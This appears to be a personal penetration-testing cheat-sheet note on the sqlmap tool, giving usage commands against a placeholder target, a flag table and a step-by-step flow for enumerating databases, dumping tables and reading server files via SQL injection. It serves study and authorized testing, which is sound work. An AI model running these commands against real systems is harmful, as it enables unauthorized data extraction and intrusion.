---
tags: [tool, exploitation, sqli]
---
# sqlmap

> Automatically tests for SQL injection and reads out the DB or files.
> Input: **which request** to attack + **which parameter** is suspicious.

## Usage
```bash
sqlmap -r login.req --batch --dbs                                  # from a file
sqlmap -u "http://target/login.php" --data="user=a&pass=b" --batch   # via URL
```

## Flags
| Flag                | Meaning                                |
| ------------------- | -------------------------------------- |
| `-r file`           | request from a file                    |
| `-u "url"`          | target URL                             |
| `--data="..."`      | POST parameters                        |
| `--cookie="..."`    | send a cookie                          |
| `--batch`           | no prompts                             |
| `--dbs`             | list databases                         |
| `-D / -T / -C`      | select DB / table / column             |
| `--tables / --columns / --dump` | list / extract             |
| `--is-dba`          | DB admin?                              |
| `--privileges`      | privilege list (look for **FILE**)     |
| `--file-read=/path` | read a server file                     |
| `--threads=10`      | parallelize (faster on blind)          |
| `--technique=T`     | only one technique (T=time, U=union, …) |

## Typical flow
```bash
sqlmap -r req --batch --dbs                        # 1. DBs
sqlmap -r req --batch -D DB --tables               # 2. tables
sqlmap -r req --batch -D DB -T T --columns         # 3. columns
sqlmap -r req --batch -D DB -T T --dump            # 4. extract
```

> [!warning] Don't use "Copy as cURL" in `-r`
> That's a curl command, not a raw HTTP request. Use the raw request or `-u --data --cookie`.
